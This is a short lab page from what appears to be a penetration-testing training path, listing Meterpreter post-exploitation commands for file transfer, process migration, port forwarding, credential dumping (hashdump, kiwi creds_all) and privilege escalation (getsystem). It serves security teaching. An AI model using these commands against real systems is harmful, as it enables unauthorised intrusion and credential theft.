# Lab 03: Meterpreter Post-Exploitation

[⬅️ Previous](Lab-02-Easy-Track-Metasploit-Exploitation.md) | [🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-04-Intermediate-Track-Password-Cracking.md)

---

## 🎯 Lab Objective
Perform post-exploitation tasks with Meterpreter.

## 🌐 Direct Lab Access
- Metasploit Docs: https://docs.metasploit.com/docs/using-metasploit/meterpreter/

---

## 📝 Meterpreter Commands

### System Info
```bash
sysinfo
getuid
getprivs
```

### File System
```bash
pwd
ls
cd /path
download file.txt
upload file.txt
edit file.txt
```

### Process
```bash
ps
migrate <pid>
getpid
```

### Network
```bash
ipconfig
route
portfwd add -l 8080 -p 80 -r 192.168.1.11
```

### Credentials
```bash
hashdump
load kiwi
creds_all
```

### Priv Esc
```bash
getsystem
```

### Shell
```bash
shell
```

---

## 🔗 Additional Resources
- Metasploit Post Modules: https://docs.metasploit.com/docs/using-metasploit/modules/post/

---

[⬅️ Previous](Lab-02-Easy-Track-Metasploit-Exploitation.md) | [🏠 Path Home](Home.md) | [Next Lab ➡️](Lab-04-Intermediate-Track-Password-Cracking.md)
